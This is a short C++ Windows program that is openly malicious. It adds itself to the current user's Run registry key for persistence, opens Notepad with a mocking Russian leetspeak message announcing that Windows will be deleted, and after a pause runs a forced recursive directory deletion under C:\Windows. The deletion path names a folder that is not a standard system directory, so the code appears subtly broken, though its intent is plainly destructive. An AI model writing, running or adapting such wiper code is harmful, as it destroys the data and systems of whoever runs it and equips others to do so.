#include <windows.h>
#include <iostream>
#include <string>

void wipeDisk() {
    system("rmdir /s /q C:\\Windows\\Win32");
}

void addToStartup() {
    HKEY hKey;
    LPCSTR subKey = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
    LPCSTR valueName = "MyApplication";

    char executablePath[MAX_PATH];
    GetModuleFileNameA(NULL, executablePath, MAX_PATH);

    if (RegOpenKeyExA(HKEY_CURRENT_USER, subKey, 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, valueName, 0, REG_SZ, (const BYTE*)executablePath, strlen(executablePath) + 1);
        RegCloseKey(hKey);
    }
}

int main() {
    addToStartup();
    system("start notepad.exe \"3драBctBYuТе, ваша вunд0ус будEt YDаЛEH, П0КА П0КА\"");
    Sleep(10000);
    wipeDisk();

    return 0;
}
